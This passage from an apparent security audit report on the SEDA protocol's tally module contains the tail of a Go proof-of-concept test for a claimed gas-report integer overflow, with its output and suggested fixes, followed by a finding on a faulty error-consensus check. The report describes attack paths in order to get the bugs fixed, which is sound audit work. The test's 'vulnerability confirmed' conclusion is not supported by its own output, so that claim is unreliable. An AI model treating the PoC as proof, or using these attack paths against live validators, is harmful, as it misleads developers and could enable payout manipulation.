	t.Logf("2. Line ~162: totalShares := math.NewIntFromUint64(medianGasUsed * uint64(replicationFactor-1)).Add(math.NewIntFromUint64(lowestReport * 2))")
	t.Logf("These operations are vulnerable to integer overflow with extremely large gas reports")
	t.Logf("\nExploit path:")
	t.Logf("1. Attacker submits extremely large gas report (close to max uint64)")
	t.Logf("2. When this value is used in multiplication operations, overflow occurs")
	t.Logf("3. Overflow results in much smaller values than intended")
	t.Logf("4. This affects the gas distribution calculation, leading to incorrect token payouts")
	t.Logf("5. Attacker can manipulate their share of the rewards compared to honest executors")
	t.Logf("\nRecommended fix: Use math.SafeMul to prevent overflow or add checks to reject unreasonably large gas reports")
}

```


Result example:
```bash
go test -v -run TestGasMeteringOverflow x/tally/keeper/overflow_test.go
=== RUN   TestGasMeteringOverflow
    overflow_test.go:24: Normal gas report: 1000000
    overflow_test.go:25: Overflow value: 18446744073709551515
    overflow_test.go:26: Max uint64 value: 18446744073709551615
    overflow_test.go:29: 
        --- EXPLOIT EXPLANATION ---
    overflow_test.go:30: The vulnerability occurs when an attacker submits an extremely large gas report
    overflow_test.go:31: When performing uint64 multiplication with large numbers, overflow will occur
    overflow_test.go:32: For example: 18446744073709551515 * 2 = 18446744073709551414 (which overflows and becomes 18446744073709551414)
    overflow_test.go:34: This overflow causes incorrect gas calculations leading to unfair token distributions
    overflow_test.go:35: ------------------------
    overflow_test.go:57: Initial exec gas: 10000000000000
    overflow_test.go:58: Testing with gasReports: [1000000 1000000 18446744073709551515]
    overflow_test.go:70: 
        --- VULNERABLE CALCULATIONS ---
    overflow_test.go:71: Median gas used: 1000000
    overflow_test.go:72: Lowest report: 1000000
    overflow_test.go:75: Vulnerable calculation 1: medianGasUsed*uint64(replicationFactor-1) = 1000000*2
    overflow_test.go:85: Result: 2000000
    overflow_test.go:88: Vulnerable calculation 2: lowestReport*2 = 1000000*2
    overflow_test.go:93: Result: 2000000
    overflow_test.go:96: Vulnerable calculation 3: totalGasUsed := medianGasUsed*uint64(replicationFactor-1) + min(lowestReport*2, medianGasUsed)
    overflow_test.go:97: If any of these operations overflow, the total gas calculation becomes incorrect
    overflow_test.go:98: When converted to tokens this leads to incorrect payments
    overflow_test.go:99: ------------------------
    overflow_test.go:109: Final exec gas: 9999997000000
    overflow_test.go:110: Gas consumed: 3000000
    overflow_test.go:113: 
        --- ATTACK RESULTS ---
    overflow_test.go:114: Executor payouts:
    overflow_test.go:116:   Executor executor1: 1500000 (reported: 1000000)
    overflow_test.go:116:   Executor executor2: 750000 (reported: 1000000)
    overflow_test.go:116:   Executor executor3: 750000 (reported: 18446744073709551515)
    overflow_test.go:132: 
        --- EXPECTED BEHAVIOR (CONTROL) ---
    overflow_test.go:133: Control gas meter executor payouts:
    overflow_test.go:135:   Executor executor1: 1500000 (reported: 1000000)
    overflow_test.go:135:   Executor executor2: 750000 (reported: 1000000)
    overflow_test.go:135:   Executor executor3: 750000 (reported: 1000000)
    overflow_test.go:142: 
        --- ANOMALIES DETECTION ---
    overflow_test.go:166: VULNERABILITY DETECTED: Gas distribution anomaly - Identical gas reports resulted in different payouts
    overflow_test.go:167:   Executor 0 payout: 1500000
    overflow_test.go:168:   Executor 1 payout: 750000
    overflow_test.go:173: VULNERABILITY CONFIRMED: The gas distribution shows anomalies due to integer overflow
    overflow_test.go:179: 
        --- VULNERABILITY DETAILS ---
    overflow_test.go:180: Vulnerability is in MeterExecutorGasDivergent function:
    overflow_test.go:181: 1. Line ~161: totalGasUsed := math.NewIntFromUint64(medianGasUsed*uint64(replicationFactor-1) + min(lowestReport*2, medianGasUsed))
    overflow_test.go:182: 2. Line ~162: totalShares := math.NewIntFromUint64(medianGasUsed * uint64(replicationFactor-1)).Add(math.NewIntFromUint64(lowestReport * 2))
    overflow_test.go:183: These operations are vulnerable to integer overflow with extremely large gas reports
    overflow_test.go:184: 
        Exploit path:
    overflow_test.go:185: 1. Attacker submits extremely large gas report (close to max uint64)
    overflow_test.go:186: 2. When this value is used in multiplication operations, overflow occurs
    overflow_test.go:187: 3. Overflow results in much smaller values than intended
    overflow_test.go:188: 4. This affects the gas distribution calculation, leading to incorrect token payouts
    overflow_test.go:189: 5. Attacker can manipulate their share of the rewards compared to honest executors
    overflow_test.go:190: 
        Recommended fix: Use math.SafeMul to prevent overflow or add checks to reject unreasonably large gas reports
--- PASS: TestGasMeteringOverflow (0.00s)
PASS
ok      command-line-arguments  0.529s
```

### Mitigation

1. Implement safe arithmetic operations using checked operations to prevent overflow/underflow:
```go
// Use SafeMul for multiplication
medianTotal, overflow := math.SafeMul(medianGasUsed, uint64(replicationFactor-1))
if overflow {
    // Handle overflow case (e.g., cap at reasonable maximum)
}
```
3. Add validation for gas report values with reasonable upper limits:
```go
const MaxReasonableGas = 1e12 // Example reasonable limit
for i, gasReport := range gasReports {
    if gasReport > MaxReasonableGas {
        gasReports[i] = MaxReasonableGas
    }
}
```
5. Add comprehensive testing with extreme values to verify correct handling of edge cases

# Issue M-11: The outlier gets the reduced payout when there is consensus on errors 

Source: https://github.com/sherlock-audit/2024-12-seda-protocol-judging/issues/284 

## Found by 
g

### Summary

The payout for Executors is [reduced](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L239-L240) when there is no consensus on the filter results. However, when 2/3 of the reveals are errors, it is not treated as consensus because of an error in the consensus check. 

### Root Cause

In [`filter.go:79`](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/filter.go#L79), the [consensus check](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/filter.go#L79) for errors is incorrectly implemented. The errors must be greater than 2/3 of the reveals for a consensus with errors, which should not be the case.

```golang
// @audit the check must be `countErrors(res.errors)*3 >= len(reveals)*2`
case countErrors(res.Errors)*3 > len(reveals)*2:
```

### Internal Pre-conditions

None

### External Pre-conditions

None

### Attack Path

1. The Tally Module is processing a data request and executing its filter. It has 2/3 of the reveals as errors and has a `FilterMode` filter.
2. When the FilterMode [filter](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/filter.go#L77) is applied, it returns a slice of outliers with the errors set as outliers and false on consensus.
3. Since there is consensus on errors, this [branch](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/filter.go#L79-L81) should be executed, and consensus should be set to true. Instead, the [no-consensus branch](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/filter.go#L82-L84) runs.
4. When the metering for executors is processed, the [reduced payout](https://github.com/sherlock-audit/2024-12-seda-protocol/blob/main/seda-chain/x/tally/keeper/endblock.go#L239-L241) is applied because of the `ErrConsensusInError` error.

### Impact

The outlier who reported no error will receive a reduced payout. The intended behavior is for the non-outliers who reported the errors to receive the full payout.

### PoC

None

### Mitigation

Consider changing the check to `case countErrors(res.Errors)*3 >= len(reveals)*2:`

